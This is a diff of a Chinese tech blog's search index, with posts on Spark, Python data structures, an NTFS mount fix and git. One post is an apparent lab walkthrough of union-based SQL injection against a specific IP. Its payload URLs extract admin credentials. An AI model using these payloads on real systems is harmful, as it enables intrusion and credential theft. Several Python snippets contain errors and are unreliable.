title="RDD队列流"></p><p><img src="/images/RDD%E9%98%9F%E5%88%97%E6%B5%81-2.png" alt="Github" title="结果"></p><p>Spark也支持从兼容HDFS API的文件系统读取数据和通过Socket端口监听并接收数据，创建数据流。<br><img src="/images/RDD%E6%96%87%E4%BB%B6%E6%B5%81.png" alt="Github" title="RDD文件流"></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Spark</title>
-      <link href="2018/09/17/Hive/"/>
-      <url>2018/09/17/Hive/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Spark-笔记"><a href="#Spark-笔记" class="headerlink" title="Spark 笔记"></a>Spark 笔记</h1><ul><li><h2 id="Spark架构设计"><a href="#Spark架构设计" class="headerlink" title="Spark架构设计"></a>Spark架构设计</h2></li></ul><p><strong>基本概念：</strong></p><p>1.RDD:弹性分布式数据集，是分布式内存的一个抽象概念，提供了一种高度受限的共享内存模型。<br>2.Executor:运行在工作节点（Worker Node）上的一个进程，负责运行任务，并为应用程序存储数据。<br>3.DAG:有向无环图（Driected Acyclic Graph）,反映RDD之间的依赖关系（宽依赖和窄依赖）。<br>4.应用：用户编写的Spark应用程序。<br>5.任务：运行在Exector的工作单元。<br>6.作业：一个作业包含多个RDD及作用在相应RDD上的各种操作。<br>7.阶段：是作业的基本调度单位，一个作业会分为多组任务，每组任务被成为”阶段“或者“任务集”。</p><p><strong>架构图</strong></p><p><img src="/images/Spark-1.png" alt="Github" title="Spark"></p><p><strong>运行基本流程</strong></p><p>1.当一个Spark应用被提交时，首先为这个应用构建起基本的运行环境，即由任务控制节点（Driver）创建一个SparkContext,由SparkContext负责和资源管理器（Cluster Manager）的通信以及资源的申请、任务的分配和监控等。SparkContext会向资源管理器注册并申请运行Executor的资源。<br>2.资源管理器为Executor分配资源，并启动Executor进程，Executor运行情况将随着“心跳”发送给资源管理器。<br>3.SparkContext根据RDD的依赖关系构建DAG图，DAG图提交给DAG调度器进行解析，将DAG图分解为多个“阶段”（每个阶段就是一个“任务集”），并且计算出各个阶段之间的依赖关系，然后把一个个“任务集”提交给底层的任务调度器进行处理，Executor向SparkContext申请任务，任务调度器将任务分发给Executor运行。同时，SparkContext将应用程序代码发给Executor。<br>4.任务在Executor上运行，把执行结构反馈给任务调度器，然后反馈给DAG调度器，运行完毕后写入数据并释放所有资源。</p><p>参照：<a href="http://dblab.xmu.edu.cn/blog/1709-2/">http://dblab.xmu.edu.cn/blog/1709-2/</a></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Spark </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spark</title>
+    <url>/2018/09/17/Hive/</url>
+    <content><![CDATA[<h1 id="Spark-笔记"><a href="#Spark-笔记" class="headerlink" title="Spark 笔记"></a>Spark 笔记</h1><ul>
+<li><h2 id="Spark架构设计"><a href="#Spark架构设计" class="headerlink" title="Spark架构设计"></a>Spark架构设计</h2><strong>基本概念：</strong></li>
+</ul>
+<p>1.RDD:弹性分布式数据集，是分布式内存的一个抽象概念，提供了一种高度受限的共享内存模型。<br>2.Executor:运行在工作节点（Worker Node）上的一个进程，负责运行任务，并为应用程序存储数据。<br>3.DAG:有向无环图（Driected Acyclic Graph）,反映RDD之间的依赖关系（宽依赖和窄依赖）。<br>4.应用：用户编写的Spark应用程序。<br>5.任务：运行在Exector的工作单元。<br>6.作业：一个作业包含多个RDD及作用在相应RDD上的各种操作。<br>7.阶段：是作业的基本调度单位，一个作业会分为多组任务，每组任务被成为”阶段“或者“任务集”。</p>
+<p><strong>架构图</strong></p>
+<p><img src="/images/Spark-1.png" alt="Github" title="Spark"></p>
+<p><strong>运行基本流程</strong></p>
+<p>1.当一个Spark应用被提交时，首先为这个应用构建起基本的运行环境，即由任务控制节点（Driver）创建一个SparkContext,由SparkContext负责和资源管理器（Cluster Manager）的通信以及资源的申请、任务的分配和监控等。SparkContext会向资源管理器注册并申请运行Executor的资源。<br>2.资源管理器为Executor分配资源，并启动Executor进程，Executor运行情况将随着“心跳”发送给资源管理器。<br>3.SparkContext根据RDD的依赖关系构建DAG图，DAG图提交给DAG调度器进行解析，将DAG图分解为多个“阶段”（每个阶段就是一个“任务集”），并且计算出各个阶段之间的依赖关系，然后把一个个“任务集”提交给底层的任务调度器进行处理，Executor向SparkContext申请任务，任务调度器将任务分发给Executor运行。同时，SparkContext将应用程序代码发给Executor。<br>4.任务在Executor上运行，把执行结构反馈给任务调度器，然后反馈给DAG调度器，运行完毕后写入数据并释放所有资源。</p>
+<p>参照：<a href="http://dblab.xmu.edu.cn/blog/1709-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1709-2/</a></p>
+]]></content>
+      <tags>
+        <tag>Spark</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python数据结构之栈</title>
+    <url>/2019/10/17/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88/</url>
+    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>栈是一种先进后出的数据结构，可以看成是一种特殊的链表，每次添加的元素都将成为头节点，每次取元素时都先取头结点。</p>
+<h1 id="栈的基本操作包括："><a href="#栈的基本操作包括：" class="headerlink" title="栈的基本操作包括："></a>栈的基本操作包括：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Node(object):</span><br><span class="line">    def __init__(self,data,next = None):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.next = next</span><br><span class="line">class Stack(object):</span><br><span class="line">    def __init__(self,top=None):</span><br><span class="line">        self.top = top</span><br><span class="line">    def push(self,data):</span><br><span class="line">        self.top = Node(data,self.top)#将元素插入到头结点的前面并成为头结点</span><br><span class="line">    def pop(self):#将元素的头结点取出</span><br><span class="line">        if self.top is None:</span><br><span class="line">            return None</span><br><span class="line">        data = self.top.data</span><br><span class="line">        self.top = self.top.next</span><br><span class="line">        return data</span><br><span class="line">    def peek(self):#查看栈顶元素，原来的栈不变</span><br><span class="line">        return self.top.data if self.top is None else None</span><br><span class="line">    def printStack(self):#打印栈元素</span><br><span class="line">        while self.top:</span><br><span class="line">            print(self.pop())</span><br><span class="line">        return </span><br><span class="line">    def isEmpty(self):#判断栈是否为空</span><br><span class="line">        if self.top is None:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    stack = Stack()</span><br><span class="line">    stack.push(1)</span><br><span class="line">    stack.push(2)</span><br><span class="line">    stack.printStack()</span><br></pre></td></tr></table></figure>
+<p>输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p>
+<h1 id="逆转字符串"><a href="#逆转字符串" class="headerlink" title="逆转字符串"></a>逆转字符串</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def revString(mystr):</span><br><span class="line">	stack = Stack()</span><br><span class="line">    for i in mystr:</span><br><span class="line">    	stack.push(i)</span><br><span class="line">    revStr = &apos;&apos;</span><br><span class="line">    while not stack.isEmpty():</span><br><span class="line">    	revStr += stack.pop()</span><br><span class="line">    return revStr</span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
+    <title>Python数据结构之链表</title>
+    <url>/2019/10/17/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<h1 id="链表的基本元素有："><a href="#链表的基本元素有：" class="headerlink" title="链表的基本元素有："></a>链表的基本元素有：</h1><ul>
+<li>节点：每个节点包含两个部分，左边部分称为值域，用来存放数据；右边部分称为指针域，用来存放指针指向下一个元素。 </li>
+<li>head节点：指向链表的第一个节点。 </li>
+<li>tail节点：指向链表的最后一个节点。 </li>
+<li>None值:链表的最后一个节点的指针域为None值<br>节点类的定义如下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Node:</span><br><span class="line">    def __init__(self,val=None,next=None):</span><br><span class="line">    	self.val = val #值域</span><br><span class="line">        self.next = next #指针域</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="链表的定义方法一："><a href="#链表的定义方法一：" class="headerlink" title="链表的定义方法一："></a>链表的定义方法一：</h1><p>可以先定义一个一个的节点，然后再把节点的关系表示出来<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node1 = Node(1)</span><br><span class="line">node2 = Node(2)</span><br><span class="line">node3 = Node(3)</span><br><span class="line">node1.next = node2</span><br><span class="line">node2.next = node3</span><br></pre></td></tr></table></figure></p>
+<h1 id="链表的定义方法二：定义链表类及其基本操作"><a href="#链表的定义方法二：定义链表类及其基本操作" class="headerlink" title="链表的定义方法二：定义链表类及其基本操作"></a>链表的定义方法二：定义链表类及其基本操作</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class LinkedList(object):</span><br><span class="line">    def __init__(self,head = None):</span><br><span class="line">        self.head = head</span><br><span class="line">    def __len__(self):#计算链表长度</span><br><span class="line">        curr = self.head</span><br><span class="line">        counter = 0</span><br><span class="line">        while curr is not None:</span><br><span class="line">            counter +=1</span><br><span class="line">            curr = curr.next</span><br><span class="line">        return counter</span><br><span class="line">    def printNode(self):#打印链表元素</span><br><span class="line">        node = self.head</span><br><span class="line">        while node is not None:</span><br><span class="line">            print(node.val)</span><br><span class="line">            node = node.next</span><br><span class="line">        return</span><br><span class="line">    def insertToFront(self,data):#从前面插入节点</span><br><span class="line">        if data is not None:</span><br><span class="line">            node = Node(data,self.head) #生成一个节点，值域为data,指针指向头结点。</span><br><span class="line">            self.head = node #将插入的节点设置为头结点</span><br><span class="line">            return node</span><br><span class="line">    def append(self,data):#从后面添加节点</span><br><span class="line">        if data is not None:</span><br><span class="line">            node = Node(data)</span><br><span class="line">            if self.head is None: #如果原链表为空则插入的节点为投机诶单</span><br><span class="line">                self.head = node</span><br><span class="line">                return node</span><br><span class="line">            curr_node = self.head</span><br><span class="line">            while curr_node.next is not None:#如果原链表不为空则找到链表的最后一个节点，让最后一个节点指向新加入的节点。</span><br><span class="line">                curr_node = curr_node.next</span><br><span class="line">            curr_node.next = node</span><br><span class="line">            return self.head</span><br><span class="line">    def delete(self,data):#删除数值为data的节点，判断当前节点的下一个节点的值是否等于要删除的值，如果是则将当前节点的指针指向当前结点下一个节点的下一个节点。</span><br><span class="line">        if self.head is None:</span><br><span class="line">            return</span><br><span class="line">        if self.head.val == data:</span><br><span class="line">            self.head = self.head.next</span><br><span class="line">            return</span><br><span class="line">        curr_node = self.head</span><br><span class="line">        while curr_node.next is not None:</span><br><span class="line">            if curr_node.next.val == data:</span><br><span class="line">                curr_node.next = curr_node.next.next</span><br><span class="line">                return</span><br><span class="line">            curr_node = curr_node.next</span><br><span class="line">    def deleteRepeat(self):#删除链表中重复的元素，初始化一个空的列表用来存放已经出现过的链表元素，查看当前节点的下一个节点的值是否已经出现在列表中如果出现则将其删除。</span><br><span class="line">        uniq = []</span><br><span class="line">        if self.head is None:</span><br><span class="line">            return</span><br><span class="line">        curr_node = self.head</span><br><span class="line">        uniq.append(self.head.val)</span><br><span class="line">        while curr_node.next is not None:</span><br><span class="line">            if curr_node.next.val in uniq:</span><br><span class="line">                curr_node.next = curr_node.next.next</span><br><span class="line">            else:</span><br><span class="line">                uniq.append(curr_node.next.val)</span><br><span class="line">                curr_node = curr_node.next</span><br><span class="line">       	return</span><br></pre></td></tr></table></figure>
+<h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmp = LinkedList()</span><br><span class="line">tmp.append(1)</span><br><span class="line">tmp.append(2)</span><br><span class="line">tmp.insertToFront(1)</span><br><span class="line">tmp.append(3)</span><br><span class="line">tmp.append(4)</span><br><span class="line">tmp.append(5)</span><br><span class="line">tmp.deletere()</span><br><span class="line">tmp.printNode()</span><br></pre></td></tr></table></figure>
+<h2 id="输出为："><a href="#输出为：" class="headerlink" title="输出为："></a>输出为：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
+    <title>Python的继承和多态</title>
+    <url>/2019/10/05/Python%E7%9A%84%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/</url>
+    <content><![CDATA[<h1 id="Python类的继承"><a href="#Python类的继承" class="headerlink" title="Python类的继承"></a>Python类的继承</h1><p>定义一个父类Person:  </p>
+<pre><code>class Person(object):
+    def __init__(self,name,sex):
+        self.name = name
+        self.sex = sex
+    def print_title(self):
+        if self.sex == &quot;male&quot;:
+            print(&quot;man&quot;)
+        else self.sex == &quot;female&quot;:
+            print(&quot;woman&quot;)
+</code></pre><p>定义一个Child类继承父类Person:</p>
+<pre><code>class Child(Person):
+    pass
+</code></pre><p>新建子类和父类的对象：</p>
+<pre><code>May = Child(&quot;May&quot;,&quot;female&quot;)
+Peter = Person(&quot;Peter&quot;,&quot;male&quot;) print(May.name,May.sex,Peter.name,Peter.sex)#子类将继承父类的方法和属性
+May.print_title()
+Peter.print_title()
+</code></pre><h2 id="Python两个判断继承的函数：isinstance-和issubclass"><a href="#Python两个判断继承的函数：isinstance-和issubclass" class="headerlink" title="Python两个判断继承的函数：isinstance()和issubclass()"></a>Python两个判断继承的函数：isinstance()和issubclass()</h2><p>isinstance()用于检查实例的类型,issubclass()用于检查类继承：</p>
+<pre><code>isinstance(May,Child) == True
+issubclass(Child,Person)==True
+</code></pre><h1 id="Python类的多态"><a href="#Python类的多态" class="headerlink" title="Python类的多态"></a>Python类的多态</h1><p>子类可以重写父类的方法，如果子类在创建时重新父类的方法则父类的方法被覆盖，如果不重写则可以直接使用父类的方法。</p>
+<pre><code>class Child(Person):#重写print_title()方法               
+    def print_title(self):
+        if self.sex == &quot;male&quot;:
+            print(&quot;boy&quot;)
+        elif self.sex == &quot;female&quot;:
+            print(&quot;girl&quot;)
+</code></pre><h1 id="Python使用下划线作为变量前缀和后缀制定特殊方法-变量"><a href="#Python使用下划线作为变量前缀和后缀制定特殊方法-变量" class="headerlink" title="Python使用下划线作为变量前缀和后缀制定特殊方法/变量"></a>Python使用下划线作为变量前缀和后缀制定特殊方法/变量</h1><ul>
+<li>__foo被看作是类”私有的“，类外和子类都不能访问，不能用‘from module import *’导入，只能通过类对象访问。</li>
+<li>_foo 被看作是类”受保护的“，只有类对象和子类对象自己能访问，不能通过‘from module import *’导入。</li>
+<li>__foo__ 代表Python里特殊方法专用标识。</li>
+</ul>
+<h1 id="Python的构造函数-new-和初始化函数-init"><a href="#Python的构造函数-new-和初始化函数-init" class="headerlink" title="Python的构造函数__new__()和初始化函数__init__()"></a>Python的构造函数__new__()和初始化函数__init__()</h1><ul>
+<li><p>“__new__(cls,<em>args,**kargs)“方法在Python中是真正的构造方法（创建并返回实例），是在类实例化对象时第一个调用的方法，将返回实例对象，通过这个方法可以产生一个”cls”对应的实例对象，所以说”__ new__(cls,</em>args,**kargs)”方法一定要有返回</p>
+</li>
+<li><p>对于”__ init__ (self,<em>args,**kwags)“方法，是一个初始化的方法，“self”代表由类产生出来的实例对象，” __init__(self,</em>args,**kwags)”将对这个对象进行相应的初始化操作。</p>
+</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>Spark Streaming</title>
+    <url>/2018/09/18/Spark-Streaming/</url>
+    <content><![CDATA[<h1 id="Spark-Streaming"><a href="#Spark-Streaming" class="headerlink" title="Spark Streaming"></a>Spark Streaming</h1><blockquote>
+<p>Spark Streaming是构建在Spark上的实时计算框架，它扩展了Spark处理大规模流式数据的能力。Spark Streaming可结合批处理和交互查询，适合一些需要对历史数据和实时数据进行结合分析的应用场景。Spark Streaming最主要的抽象是DStream（Discretized Stream，离散化数据流），表示连续不断的数据流。在内部实现上，Spark Streaming的输入数据按照时间片（如1秒）分成一段一段的DStream，每一段数据转换为Spark中的RDD，并且对DStream的操作都最终转变为对相应的RDD的操作。</p>
+</blockquote>
+<h2 id="Spark-Streaming程序基本步骤"><a href="#Spark-Streaming程序基本步骤" class="headerlink" title="Spark Streaming程序基本步骤"></a>Spark Streaming程序基本步骤</h2><ol>
+<li>通过创建输入DStream来定义输入源。</li>
+<li>通过对DStream应用转换操作和输出操作来定义流计算。</li>
+<li>用streamingContext.start()来开始接收数据和处理流程。</li>
+<li>通过streamingContext.awaitTermination()方法来等待处理结束（手动结束或因为错误而结束）。</li>
+<li>可以通过streamingContext.stop()来手动结束流计算进程。<h2 id="RDD队列流"><a href="#RDD队列流" class="headerlink" title="RDD队列流"></a>RDD队列流</h2><blockquote>
+<p>在调试Spark Streaming应用程序的时候，我们可以使用streamingContext.queueStream(queueOfRDD)创建基于RDD队列的DStream。</p>
+</blockquote>
+</li>
+</ol>
+<p>下面是参考Spark官网的QueueStream程序设计的程序，每隔1秒创建一个RDD，Streaming每隔2秒就对数据进行处理。</p>
+<p><img src="/images/RDD队列流.png" alt="Github" title="RDD队列流"></p>
+<p><img src="/images/RDD队列流-2.png" alt="Github" title="结果"></p>
+<p>Spark也支持从兼容HDFS API的文件系统读取数据和通过Socket端口监听并接收数据，创建数据流。<br><img src="/images/RDD文件流.png" alt="Github" title="RDD文件流"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Spark reduceByKey使用时遇到的问题</title>
+    <url>/2018/09/27/Spark-reduceByKey%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="reduceByKey-func-不会处理单一值的RDD"><a href="#reduceByKey-func-不会处理单一值的RDD" class="headerlink" title="reduceByKey(func)不会处理单一值的RDD"></a>reduceByKey(func)不会处理单一值的RDD</h1><ul>
+<li><p>reduceByKey(func)的功能是，使用func函数合并具有相同键的值。比如，reduceByKey((a,b) =&gt; a+b)，有四个键值对(“spark”,1)、(“spark”,2)、(“hadoop”,3)和(“hadoop”,5)，对具有相同key的键值对进行合并后的结果就是：(“spark”,3)、(“hadoop”,8)。</p>
+</li>
+<li><p><strong>但是，当reduceByKey(func)中的func函数对值进行split操作时，对于只有唯一值的RDD不会被split。下面使用创建的简单数据进行说明:</strong></p>
+</li>
+</ul>
+<blockquote>
+<p>统计原始数据中相同姓名都出现了哪些数字，原始数据如下图所示：</p>
+</blockquote>
+<p><img src="/images/reduceByKey-question/rawdata.jpg" alt="github"></p>
+<p>可以看到数据中姓名后面的数字中含有”\t”。</p>
+<blockquote>
+<p>读取文件数据并将其map成键值对的形式，得到的结果如下图所示：</p>
+</blockquote>
+<p><img src="/images/reduceByKey-question/FirstMap.jpg" alt="github"></p>
+<p>我们看到数据读入后”\t”变为”\\t”,姓名成为键，后面的数字成为了值。</p>
+<blockquote>
+<p>使用reduceByKey合并相同姓名后面出现的数字，在这个过程中使用split(“\t”)对值进行切分。</p>
+</blockquote>
+<p><img src="/images/reduceByKey-question/reduceByKey.jpg" alt="github"></p>
+<p>从结果中可以看出，“xiaoguniang” 的值并没有被split.reduceByKey中不能对唯一值的RDD进行后面的func。也就是说当只有一个值的RDD出现时reduceByKey是不对其进行处理的。</p>
+<blockquote>
+<p>为此，为了达到想要的效果我们对代码进行改进，使用mapValue()对Value进行预处理，之后再进行reduceByKey()。</p>
+</blockquote>
+<p><img src="/images/reduceByKey-question/improve.jpg" alt="github"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>linux挂载U盘失败</title>
+    <url>/2019/11/24/linux%E6%8C%82%E8%BD%BDU%E7%9B%98%E5%A4%B1%E8%B4%A5/</url>
+    <content><![CDATA[<h1 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h1><ul>
+<li>linux系统在未完全完成U盘的写操作时就将U盘拔掉，造成再次插入U盘时出现无法挂载的问题：</li>
+</ul>
+<p>Error mounting /dev/sdb1 at /media/xxx/xx: Command-line`mount -t “ntfs” -o”uhelper=udisks2,nodev,nosuid,uid=1000,gid=1000,dmask=0077,fmask=0177””/dev/sdb1” “/media/eden/文檔”‘ exited with non-zero exit status14: The disk contains an unclean file system (0, 0).<br>Metadata kept in Windows cache, refused to mount.<br>Failed to mount ‘/dev/sdb1’: Operation not permitted<br>The NTFS partition is in an unsafe state. Please resume andshutdown<br>Windows fully (no hibernation or fast restarting), or mount thevolume<br>read-only with the ‘ro’ mount option.</p>
+<h1 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h1><ul>
+<li>从错误信息中可以看到U盘的分区位于/dev/sdb1，我们使用命令：<font color="#dd0000">sudo ntfsfix /dev/sdb1</font> 来修复这个错误。</li>
+<li>ntfsfix 实用程序可修复一些常见的 NTFS 问题，它将修复一些基本的 NTFS 不一致性，重置 NTFS 日志文件并在下次重新引导操作系统时安排进行 NTFS 一致性检查。</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入得到数据库的用户名和密码</title>
+    <url>/2021/03/08/sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h1 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h1><ul>
+<li>当输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=1</a><br>时网站显示正常</li>
+<li>当输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2</a><br>时网站显示不正常，判断注入点在此。</li>
+</ul>
+<h1 id="确定网站的回传的字段数"><a href="#确定网站的回传的字段数" class="headerlink" title="确定网站的回传的字段数"></a>确定网站的回传的字段数</h1><ul>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201</a><br>网站显示正常，结尾用order by 2 时仍显示正常，当使用order by 3 时页面显示不正常，判断网站包含两个字段。</li>
+</ul>
+<h1 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h1><ul>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2</a><br>时页面显示出来2，确定了回显地点。</li>
+</ul>
+<h1 id="确定数据库名称"><a href="#确定数据库名称" class="headerlink" title="确定数据库名称"></a>确定数据库名称</h1><ul>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()</a><br>出现当前数据库的名称：maoshe</p>
+<h1 id="确定当前数据库包含的表"><a href="#确定当前数据库包含的表" class="headerlink" title="确定当前数据库包含的表"></a>确定当前数据库包含的表</h1></li>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1</a><br>返回当前数据库包含的第一个表名：admin。</p>
+</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1</a><br>页面异常，表示当前数据库只包含一个表。</li>
+</ul>
+<p><strong><em>limit用法</em></strong></p>
+<ul>
+<li>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。<h1 id="确定当前数据库表包含的列名"><a href="#确定当前数据库表包含的列名" class="headerlink" title="确定当前数据库表包含的列名"></a>确定当前数据库表包含的列名</h1></li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1</a><br>得到第一列的名称为：Id</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%</a><br>20and%20table_name=%27admin%27%20limit%201,1<br>得到第二列的名称为：username </li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1</a><br>得到第三列的名称为：password </li>
+<li>输入limit 3,1时页面异常，说明admin表只包含三列。<h1 id="确定当前表记录的用户"><a href="#确定当前表记录的用户" class="headerlink" title="确定当前表记录的用户"></a>确定当前表记录的用户</h1></li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1</a><br>得到第一个用户为admin</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1</a><br>得到第二个用户为：ppt领取微信 。</li>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1</a><br>页面异常，说明只包含两个用户。</p>
+<h1 id="确定用户的密码"><a href="#确定用户的密码" class="headerlink" title="确定用户的密码"></a>确定用户的密码</h1></li>
+<li><p>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1</a><br>得到admin用户的密码为：hellohack </p>
+</li>
+<li>输入<br><a href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1</a><br>得到第二个用户的密码为：zkaqbanban </li>
+</ul>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python可变数据类型和不可变数据类型</title>
+    <url>/2019/09/25/python%E5%8F%AF%E5%8F%98%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E4%B8%8D%E5%8F%AF%E5%8F%98%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
+    <content><![CDATA[<h1 id="Python的可变数据类型和不可变数据类型："><a href="#Python的可变数据类型和不可变数据类型：" class="headerlink" title="Python的可变数据类型和不可变数据类型："></a>Python的可变数据类型和不可变数据类型：</h1><h2 id="可变数据类型："><a href="#可变数据类型：" class="headerlink" title="可变数据类型："></a>可变数据类型：</h2><p>list：数组是有序的，dict:字典是无序的，多次print一个数组得到的字典顺序可能不一样，可变的set：集合是无序不重复的。Python在声明可变类型后再次声明同样内容的可变类型时，Python会重新申请空间对其进行存储。例如：a=[1,2,3],b=[1,2,3],a is b False， a==b True。is可以用来判断两个变量是否指向同一地址，”==“来判断两个变量的值是否相等。”=“是赋值操作，当a=b时，a,b指向的是同一地址，改变a的值，b的值也会发生变化。</p>
+<h2 id="不可变数据类型："><a href="#不可变数据类型：" class="headerlink" title="不可变数据类型："></a>不可变数据类型：</h2><p>string,数值类型，元祖：有序的，不可变set.Python在声明不可变数据类型时会在已经声明的不可变类型对象中找该对象是否已经被声明过，如果已经声明过则变量会直接指向该对象，不会再申请新的内存空间。相当于增加了对象的引用。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>向github提交本地仓库</title>
+    <url>/2019/03/09/%E5%90%91gitHub%E6%8F%90%E4%BA%A4%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/</url>
+    <content><![CDATA[<h2 id="如果需要将本地生成的工程提交到github相应的仓库中的步骤如下："><a href="#如果需要将本地生成的工程提交到github相应的仓库中的步骤如下：" class="headerlink" title="如果需要将本地生成的工程提交到github相应的仓库中的步骤如下："></a>如果需要将本地生成的工程提交到github相应的仓库中的步骤如下：</h2><blockquote>
+<p>1、在github上新建立相应的仓库名称，比如：blog。</p>
+</blockquote>
+<blockquote>
+<p>2、cd到本地工程的根目录下。</p>
+</blockquote>
+<blockquote>
+<p>3、使用命令：git init 初始化本地仓库。</p>
+</blockquote>
+<blockquote>
